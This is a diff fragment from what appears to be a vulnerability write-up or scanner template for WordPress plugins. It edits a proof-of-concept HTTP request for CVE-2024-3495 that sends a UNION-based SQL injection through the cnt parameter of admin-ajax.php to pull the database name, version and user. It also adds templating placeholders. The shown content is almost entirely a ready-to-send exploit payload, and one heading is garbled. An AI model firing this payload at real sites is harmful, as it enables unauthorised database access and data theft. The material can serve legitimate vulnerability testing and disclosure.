@@ -25,17 +25,18 @@ page=es_subscribers&is_ajax=1&action=_sent&advanced_filter[conditions][0][0][fie
 ```
 ### Proof of concept CVE 2024-CVE-2024-3495
 ```bash
-POST /wp-admin/admin-ajax.php HTTP/2
-Host: [target.com]
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: <Host>
 Accept-Encoding: gzip, deflate
 Accept: */*
 Accept-Language: en-US;q=0.9,en;q=0.8
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+Connection: close
 Cache-Control: max-age=0
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 172
 
-action=tc_csca_get_states&nonce_ajax=[targetnonce]&cnt=1+or+0+union+select+concat(0x64617461626173653a,database(),0x7c76657273696f6e3a,version(),0x7c757365723a,user()),2,3--+-
+action=tc_csca_get_states&nonce_ajax={{nonce}}&cnt=1+or+0+union+select+concat(0x64617461626173653a,database(),0x7c76657273696f6e3a,version(),0x7c757365723a,user()),2,3--+-
 ```
 
 ### How to fix ? for [CVE-2024-2876]
